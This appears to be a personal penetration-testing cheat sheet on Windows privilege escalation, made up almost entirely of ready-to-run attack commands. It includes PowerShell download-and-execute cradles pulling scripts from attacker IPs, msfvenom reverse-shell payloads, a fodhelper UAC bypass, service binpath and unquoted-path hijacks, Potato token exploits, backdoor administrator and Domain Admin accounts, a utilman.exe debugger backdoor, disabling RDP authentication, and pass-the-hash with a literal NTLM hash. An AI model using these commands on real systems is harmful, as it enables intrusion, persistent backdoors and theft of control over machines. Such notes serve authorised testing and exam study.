# Windows



{% embed url="https://lolbas-project.github.io/" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" %}

{% embed url="https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/windows/windows-examples.rst" %}

#### powerup

<pre data-overflow="wrap"><code><strong>
</strong>powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.129/PowerUp.ps1'); Invoke-AllChecks"

IWR -Uri http://192.168.45.5/PowerUp.ps1 -OutFile C:\tmp\PowerUp.ps1
. .\PowerUp.ps1 ; Invoke-AllChecks

Get-Command -Module powerup
</code></pre>

{% embed url="https://evi1cg.me/archives/Powerup.html" %}

#### winpeas / windows-exploit-suggester.py

{% code overflow="wrap" %}
```
winpeasany.exe
winpeas.bat
powershell "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.132:8080/WinPeas.bat')"

./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo systeminfo.txt
(cmd.exe /c "systeminfo")
```
{% endcode %}

### Windows

#### AlwaysInstallElevated install .msi shell

{% code overflow="wrap" %}
```
#see 0x1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

cmd.exe /c 'systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"'
(check system type x86 or x64)

msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x64 --platform Windows -f msi -o shell.msi
```
{% endcode %}

#### `fodhelper.exe` privesc

`Administrators group` account `whoami /groups` `Medium` -> `High Mandatory` level

{% code overflow="wrap" %}
```
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "shell/ps.exe" /f
REG QUERY HKCU\Software\Classes\ms-settings\Shell\Open\command /s
fodhelper.exe /s

ComputerDefaults.exe /s
changepk.exe /s
```
{% endcode %}

#### Weak service permission&#x20;

* A low privileged user is allowed to change service configuration - for example change the service binary the service launches when it starts
* A low privileged user can overwrite the binary the service launches when it starts

{% hint style="info" %}
`SERVICE_ALL_ACCESS` or  `SERVICE_CHANGE_CONFIG`

Short life shell, need persist it by setting 2 listeners and run 2nd shell in & b4 1st shell die
{% endhint %}

<pre data-overflow="wrap"><code>#enum for a target svc

.\accesschk.exe -uws "Everyone" "C:\Program Files"
or
powershell Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
or
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
or
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
<strong>.\accesschk.exe /accepteula -ucv "user" targetsvc
</strong></code></pre>

```
SERVICE_CHANGE_CONFIG:
#change exec path
sc.exe config targetsvc binpath= "c:\shell.exe"
```

```
SERVICE_ALL_ACCESS:
# check current binpath
sc.exe qc target

# check M access on the original service.exe from binpath
icacls C:\service.exe

cp C:\shell.exe C:\service.exe
sc start targetsvc
```

```
receive SYSTEM shell
listen & run shell.exe again to persist the short life shell
(need 2 listeners, make it to 2nd listener in 1st listener b4 it dies)
```

#### Unquoted service path

To list nonstandard services that start automatically

{% code overflow="wrap" %}
```
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows" 
```
{% endcode %}

find returned service having path without " " and find if precedential dir writable

```
icalcls "C:\puppet"
```

{% code overflow="wrap" %}
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.221 LPORT=4443 -f exe -o shell.exe

nc -nlvp 4443
python -m http.server 8080

$wc = New-Object System.Net.WebClient
$wc.DownloadFile("http://192.168.119.221:8080/shell.exe", "C:\program files\My.exe")
```
{% endcode %}

{% code overflow="wrap" %}
```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```
{% endcode %}

#### JuicyPotato ( `SeImpersonate` / `SeAssignPrimaryToken` )&#x20;

{% code overflow="wrap" %}
```
whoami /priv

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.129 LPORT=4433 -f exe > shell.exe

nc -nlvp 4433

PS C:\inetpub\wwwroot> c:\inetpub\wwwroot\JuicyPotato.exe -l 2145 -p c:\inetpub\wwwroot\shell.exe -t *

C:\Users\Public\JuicyPotato.exe -t t -p C:\Users\Public\whoami.exe -l 5837
-p specifies the program we are trying to run
-l specify COM server listening arbitrary port
-t process creation mode (t if have selmpersonate priv)
```
{% endcode %}

{% hint style="info" %}
May need to find an CLSID for the Windows version

[https://github.com/ohpe/juicy-potato/tree/master/CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID)

JuicyPotato.exe -l 12345 -p C:\Users\Rob\Desktop\rev.exe-t \* -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
{% endhint %}

#### RouguePotato/PrintSpoofer `SeImpersonate`

```
 Windows 10 and Server 2016/2019.
 
 .\PrintSpoofer64.exe -c .\shell.exe
```

{% embed url="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer" %}

#### ms16-032 (w/o KB3139914) <a href="#articlecontentid" id="articlecontentid"></a>

```
wmic qfe list | find "3139914"
```

{% code overflow="wrap" %}
```

https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1

. .\Invoke-MS16-032.ps1
Invoke-MS16-032.ps1

powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://192.168.45.5/Invoke-MS16-032.ps1');Invoke-MS16-032 -Application cmd.exe -commandline '/c net user evi1cg test123 /add'"
```
{% endcode %}

#### Create user for persistency as admin/system

```
net user kali pass1234! /add
net localgroup administrators kali /add
net localgroup "remote desktop users" kali /add

net group "Domain Admins" kali /add

impacket-psexec kali@ip

can add /domain flag behind if is creating with domain admin / DC ser admin
# can try with local admin?
net user kali2 kali1234 /add /Domain
net group "Domain Admins" hacker2 /add /domain
```

RDP login page "ease of access" system cmd

{% code overflow="wrap" %}
```
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f
```
{% endcode %}

#### WindowsXP SP0/1 upnphost SSDPSRV&#x20;

Need: file transfer to victim, low rev shell

{% embed url="https://sohvaxus.github.io/content/winxp-sp1-privesc.html" %}

```
sc qc upnphost
sc qc SSDPSRV
sc query SSDPSRV

sc config SSDPSRV start= auto
sc config upnphost binpath= "C:\Inetpub\wwwroot\rev2.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
net start SSDPSRV
net start upnphost

receive SYSTEM shell
listen & run C:\Inetpub\wwwroot\rev2.exe again to persist the short life shell
(need 2 listeners, make it to 2nd listener in 1st listener b4 it dies)
```

#### PSexec

{% code overflow="wrap" %}
```
PSexec.exe -s cmd.exe -accepteula (or rev.exe on local)
PSexec.exe \\DC01 (-s) cmd.exe -accepteula

-c C:\rev.exe copy the exe to remote and exec
(no -c = exec system path exe)
-d dun want for process to terminate (non-interactive, can use when rev.exe but not cmd)
-s run as system

impacket-psexec jose@192.168.168.88 -hashes :645dc5a8871d2a4269d4cbe23f6ae103   
or user:'pw'@ip

need 445 or use -port to specify; need admin user to access $Admin
```
{% endcode %}

{% hint style="info" %}
If need use PS, need a `rev.exe` and `powershell -ep bypass`in new shell
{% endhint %}

{% embed url="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec" %}

###
